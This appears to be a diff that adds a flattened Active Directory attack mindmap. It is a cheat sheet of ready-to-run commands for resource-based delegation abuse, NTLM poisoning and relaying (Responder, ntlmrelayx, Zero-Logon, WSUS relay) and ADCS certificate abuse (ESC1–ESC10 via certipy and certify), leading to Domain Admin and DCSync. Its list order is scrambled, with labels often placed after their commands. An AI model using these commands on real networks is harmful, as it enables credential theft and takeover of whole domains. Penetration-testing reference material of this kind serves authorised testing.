+- `rubeus.exe s4u /user:<fake_computer$> /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/<victim.domain.local> /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt`
+- Admin
+- `rubeus.exe hash /password:<computer_pass> /user:<computer> /domain:<domain>`
+- `rbcd.py -delegate-from '<computer>$' -delegate-to '<target>$' -dc-ip'<dc>' -action 'write'<domain>/<user>:<password>`
+- `getST.py -spn host/<dc_fqdn> '<domain>/<computer_account>:<computer_pass>' -impersonate Administrator --dc-ip <dc_ip>`
+- `Object: msDS-AllowedToActOnBehalfOfOtherIdentit`
+- `Resource-Based Constrained Delegation (RBCD)`
+- `addcomputer.py -computer-name '<computer_name>' -computer-pass '<ComputerPassword>' -dc-host <dc> -domain-netbios <domain_netbios> '<domain>/<user>:<password>'`
+- add computer account
+
+## MITM (Listen and relay)
+
+- (MITM)Listen and Relay
+
+### Listener
+
+- NetNtlmv1
+- `🔥 responder -I eth0 (use --lm to force lm downgrade)`
+- NetNtlmv2
+- Listen
+- `smbclient.py`
+- User
+
+### NTLM Relay
+
+- use exploit/windows/smb/smb_relay #windows200 / windows server2008
+- Admin
+- relay on itself
+- MS08-068
+- NetNTLMv1
+- remove mic
+- `ntlmrelayx.py --remove-mic --escalate-user <user> -t ldap://<dc_fqdn> -smb2support`
+- DcSync
+- SMB -> LDAP(S)
+- `ntlmrelayx.py -t ldaps://<dc> --remove-mic --add-computer <computer_name> <computer_password> --delegate-access -smb2support`
+- RBCD
+- NetNTLMv2
+- remove mic (CVE-2019-1040)
+- relay to LDAP
+- `ntlmrelayx -t ldap://<dc> --shadow-credentials --shadow-target '<dc>'`
+- shadow credentials
+- HTTP(S) -> LDAP
+- `nmap -Pn -sS -T4 --open --script smb-security-mode -p445 ADDRESS/MASK`
+- Find SMB not signed (default on non DC)
+- use exploit/windows/smb/smb_relay
+- NTLM relay
+- `cme smb $hosts --gen-relay-list relay.txt`
+- SMB unsigned
+- `ntlmrelayx.py -wh <attacker_ip> -t smb://<target> -l /tmp -6 -debug`
+- -> SMB
+- User
+- `🔥ntlmrelayx.py -tf targets.txt -smb2support -socks (-6)`
+- lateral move (socks)
+- http ADCS web
+- ESC8
+- -> HTTP
+- sccm ntlm relay attack
+- `ntlmrelayx.py -t mssql://<ip> -smb2support –socks`
+- relay to mssql
+- -> MSSQL
+- `ntlmrelayx.py -t dcsync://<dc_02_ip> -smb2support -auth-smb <user>:<password>`
+- coerce come from dc01, relay to dc02
+- SMB -> Netlogon
+- `Zero-Logon (safe method)(CVE-2020-1472)`
+
+### Arp poisoning
+
+- `pywsus.py`
+- wsus relay
+
+## Weak ADCS configuration
+
+- `Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt`
+- `ntlmrelayx.py -t http://<dc_ip>/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainController`
+- `gettgtpkinit.py -pfx-base64 $(cat cert.b64) <domain>/<dc_name>$ <ccache_file>`
+- Pass the ticket
+- DCSync
+- DomAdmin
+- Web enrollement is up
+- 🔥ESC8
+- `certipy relay -ca <ca_ip> -template DomainController`
+- `certipy auth -pfx <certificate> -dc-ip <dc_ip>`
+- `certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>' -ca <ca_name> -upn <target_user>@<domain>`
+- Pass the certificate
+- ESC1 (Request a certificate from a vulnerable template)
+- `certify.exe request /ca:<server>\<ca-name> /template:"<vulnerable template name>" [/altname:"Admin"]`
+- `certutil -v -dsTemplate`
+- ESC2
+- certify.exe find [ /vulnerable]
+- Get templates information
+- Misconfigured Certificate Templates
+- `certify.exe request request /ca:<server>\<ca-name> /template:<template> /onbehalfof:<domain>\<user> /enrollcert:<path.pfx> [/enrollcertpw:<cert-password>]`
+- `certipy find -u <user>@<domain> -p <password> -dc-ip <domaincontroller>`
+- `certify.exe request /ca:<server>\<ca-name> /template:"<vulnerable template name>"`
+- ESC3 (Use an enrollement agent to request a certificate)
+- `certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>' -ca <ca_name> -on-behalf-of '<domain>\<user>' -pfx <cert>`
+- `certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>' -ca <ca_name>`
+- `certipy template -u <user>@<domain> -p '<password>' -template <vuln_template> -configuration <template>.json`
+- restore template
+- `certipy template -u <user>@<domain> -p '<password>' -template <vuln_template> -save-old -debug`
+- ESC1 on vulnerable template
+- write privilege over a certificate template
+- ESC4
+- ADCS weak configuration
+- `certipy ca -ca <ca_name> -add-officer '<user>' -username <user>@<domain> -password <password>`
+- Misconfigured ACL
+- `certipy ca -u <user>@<domain> -p '<password>' -ca <ca_name> -issue-request <request_id>`
+- `certipy req -u <user>@<domain> -p '<password>' -ca <ca_name> -retreive <request_id>`
+- getACL information
+- Manage CA
+- Issue request
+- ESC7
+- `certipy req -username <user>@<domain> -password <password> -ca <ca_name> -template '<vulnerable template name>' -upn '<target_user>'`
+- `certipy ca -ca <ca_name> -enable-template '<ecs1_vuln_template>'-username <user>@<domain> -password <password>`
+- Manage certificate
+- error, but save private key
+- `certutil -TCAInfo`
+- Display CA information
+- certify.exe cas
+- Abuse ATTRIBUTESUBJECTALTNAME2 flag set on CAyou can choose any certificate template that permits client authentication
+- ESC1
+- `certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"`
+- Misconfigured CA
+- ESC6
+- Get CA flags (if remote registry is enabled)
+- certipy / certify.exe (only the flag ATTRIBUTESUBJECTALTNAME2)
+- Get PKI objects information
+- certify.exe pkiobjects
+- vulnerable PKI Object access control
+- ESC5
+- ACL
+- `certipy req -username <accountB>@<domain> -hashes <hashB> -ca <ca_name> -template <vulnerable template>`
+- ESC9
+- `certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn Administrator`
+- `certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn <accountB>@<domain>`
+- ESC9/ESC10 (Case 1)
+- [Kerberos Mapping] ESC9/ESC10(Case 1)
+- `certipy req -username <accountB>@<domain> -hashes <hashB> -ca <ca_name> -template <any template with client auth>`
+- Reset accountB UPN
+- `certipy shadow auto -username <accountA>@<domain> -p <passA> -account <accountB>`
+- ESC10 (Case 1)
+- [Schannel Mapping] ESC9/ESC10 (Case 2)
+- Misconfigured Certificate Mapping (blind test)
+- ESC9/ESC10
+- `certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn '<dc_name$>@<domain>'`
+- ESC10 (Case 2)
